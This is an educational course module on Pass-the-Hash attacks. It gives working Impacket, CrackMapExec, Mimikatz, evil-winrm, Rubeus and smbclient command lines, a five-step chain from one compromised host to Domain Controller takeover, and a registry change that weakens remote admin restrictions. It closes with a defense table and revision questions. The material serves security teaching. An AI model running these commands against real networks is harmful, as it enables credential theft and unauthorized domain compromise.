# Pass-the-Hash (PtH)

## Unit 4 - Topic 2 | Credential Attacks

---

## Overview

**Pass-the-Hash (PtH)** allows an attacker to authenticate to remote services using an NTLM hash instead of the plaintext password. This eliminates the need to crack hashes — once you have the hash, you can use it directly for lateral movement and privilege escalation.

---

## 1. How Pass-the-Hash Works

```
NORMAL AUTHENTICATION:
User → Password → NTLM Hash → Sent to server
                               ↓
                         Server verifies hash

PASS-THE-HASH:
Attacker → Stolen NTLM Hash → Sent to server
                                ↓
                          Server verifies hash
                          (Can't tell the difference!)

WHY IT WORKS:
├── NTLM authentication uses the hash, not password
├── Server only verifies the hash response
├── Hash IS the credential (no password needed)
├── Works with: SMB, WMI, WinRM, RDP (restricted admin)
└── Doesn't work with: Kerberos-only auth, NTLMv2 relay

HASH FORMAT:
LM_HASH:NTLM_HASH
aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
└── Empty LM (common)          └── NTLM hash (what we use)
```

---

## 2. Pass-the-Hash Tools

```bash
# === IMPACKET (Linux — Most Versatile) ===

# PSExec (interactive shell):
psexec.py corp.local/admin@target -hashes :NTLM_HASH
# Gets SYSTEM shell via SMB service creation

# WMIExec (stealthier):
wmiexec.py corp.local/admin@target -hashes :NTLM_HASH
# Uses WMI for execution (fewer logs)

# SMBExec:
smbexec.py corp.local/admin@target -hashes :NTLM_HASH
# Uses SMB for semi-interactive shell

# ATExec (scheduled tasks):
atexec.py corp.local/admin@target -hashes :NTLM_HASH \
  "command"

# SecretsDump (extract more hashes):
secretsdump.py corp.local/admin@target -hashes :NTLM_HASH

# === CRACKMAPEXEC (Linux — Mass Spraying) ===
# Test hash against multiple targets:
crackmapexec smb 10.0.0.0/24 -u admin -H NTLM_HASH

# Execute command:
crackmapexec smb target -u admin -H NTLM_HASH -x "whoami"

# Dump SAM on target:
crackmapexec smb target -u admin -H NTLM_HASH --sam

# === MIMIKATZ (Windows) ===
# Inject hash into current session:
sekurlsa::pth /user:admin /domain:corp.local \
  /ntlm:NTLM_HASH /run:cmd.exe
# Opens new cmd.exe authenticated as admin

# Then access resources:
dir \\target\c$
net use \\target\c$

# === EVIL-WINRM (WinRM — Port 5985) ===
evil-winrm -i target -u admin -H NTLM_HASH
# Interactive PowerShell session via WinRM

# === XFreeRDP (RDP — Restricted Admin Mode) ===
xfreerdp /u:admin /pth:NTLM_HASH /v:target
# Only works if Restricted Admin mode is enabled
```

---

## 3. PtH Attack Workflow

```
PASS-THE-HASH CHAIN:

1. EXTRACT HASH FROM COMPROMISED HOST
   mimikatz → sekurlsa::logonpasswords
   → Obtain: admin : NTLM_HASH

2. TEST HASH AGAINST NETWORK
   crackmapexec smb 10.0.0.0/24 -u admin -H HASH
   → Find: admin is local admin on 15 hosts!

3. MOVE TO HIGH-VALUE TARGET
   psexec.py corp/admin@server01 -hashes :HASH
   → SYSTEM shell on server01

4. EXTRACT MORE HASHES
   secretsdump.py corp/admin@server01 -hashes :HASH
   → New hashes: domain_admin : DA_HASH

5. ESCALATE TO DOMAIN ADMIN
   psexec.py corp/da@dc01 -hashes :DA_HASH
   → Domain Controller compromised!
```

---

## 4. Special PtH Scenarios

```bash
# === LOCAL ADMIN HASH REUSE ===
# Same local admin password across machines?
# Extract hash from one → PtH to all!
crackmapexec smb 10.0.0.0/24 -u Administrator \
  -H LOCAL_ADMIN_HASH --local-auth

# === RID 500 vs NON-RID 500 ===
# RID 500 (built-in Administrator):
# → PtH always works (even with UAC remote restrictions)
# Non-RID 500 admin:
# → PtH may be blocked by LocalAccountTokenFilterPolicy
# Fix: Set HKLM\...\LocalAccountTokenFilterPolicy = 1

# === OVERPASS-THE-HASH (NTLM → Kerberos) ===
# Convert NTLM hash to Kerberos ticket:
# Rubeus:
.\Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
# /ptt: Pass the ticket (inject into memory)

# Impacket:
getTGT.py corp.local/admin -hashes :NTLM_HASH
export KRB5CCNAME=admin.ccache
psexec.py corp.local/admin@target -k -no-pass
# Uses Kerberos instead of NTLM → stealthier

# === PASS-THE-HASH WITH DIFFERENT TOOLS ===
# Smbclient:
smbclient //target/C$ -U admin --pw-nt-hash NTLM_HASH

# Rpcclient:
rpcclient target -U admin%NTLM_HASH --pw-nt-hash

# Ldapsearch (via NTLM):
# Not directly supported — use pass-the-ticket instead
```

---

## 5. PtH Defense

| Defense | Implementation |
|---------|---------------|
| **LAPS** | Unique local admin password per machine |
| **Credential Guard** | Protects LSASS from hash extraction |
| **Disable NTLM** | Force Kerberos-only authentication |
| **Protected Users** | Group that blocks NTLM auth for members |
| **Admin tiering** | Separate DA/server/workstation admin creds |
| **Monitoring** | Detect pass-the-hash via Event ID 4624 (Type 3, NTLM) |
| **LocalAccountTokenFilterPolicy** | Keep at 0 to block remote non-RID 500 admin |

---

## Summary Table

| Concept | Key Point |
|---------|-----------|
| **PtH** | Use NTLM hash directly without cracking |
| **Best tool** | Impacket (psexec/wmiexec/smbexec) |
| **Mass spray** | CrackMapExec with -H flag |
| **Windows PtH** | Mimikatz sekurlsa::pth |
| **RID 500** | Always works for PtH, bypasses UAC |
| **Overpass-the-Hash** | Convert NTLM to Kerberos ticket |

---

## Quick Revision Questions

1. **Why does pass-the-hash work without knowing the password?**
2. **What is the difference between psexec.py and wmiexec.py?**
3. **Why is RID 500 special for PtH attacks?**
4. **What is overpass-the-hash?**
5. **How does LAPS prevent PtH lateral movement?**

---

[← Previous: NTLM Hash Extraction](01-ntlm-hash-extraction.md) | [Next: Pass-the-Ticket →](03-pass-the-ticket.md)

---

*Unit 4 - Topic 2 of 6 | [Back to README](../README.md)*
